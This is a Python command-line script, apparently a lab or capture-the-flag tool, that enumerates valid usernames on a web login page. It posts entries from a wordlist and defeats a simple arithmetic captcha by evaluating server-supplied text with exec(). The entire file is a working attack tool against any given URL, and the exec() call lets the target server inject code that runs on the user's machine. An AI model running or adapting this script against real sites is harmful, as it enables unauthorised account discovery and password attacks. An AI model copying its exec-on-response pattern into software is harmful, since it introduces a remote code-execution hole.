#!/usr/bin/python3

import requests
import re
import argparse
from termcolor import colored

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', required=True)
parser.add_argument('-w', '--wordlist', required=True)
args = parser.parse_args()

print(colored("Only for Educational Purposes\n", "red"))
print(colored("LOGIN PAGE BRUTER BY @s3rd4r308\n", "green"))

url = args.url

user_file =  open(args.wordlist, "r")

for i in range(10):
	data = {"username":"test", "password":"test"}
	r = requests.post(url, data=data)

for i in user_file:

	user = i.split()

	captcha = re.findall("[0-9]* + .* = \?", r.text)
	exec("captcha_result =" + captcha[0][4:-4])

	data = {"username":user, "password":"test", "captcha":captcha_result}
	r = requests.post(url, data=data)

	if not "does not exist" in r.text:
		print(colored("[+] User Found!: ", "green") + str(user[0]))
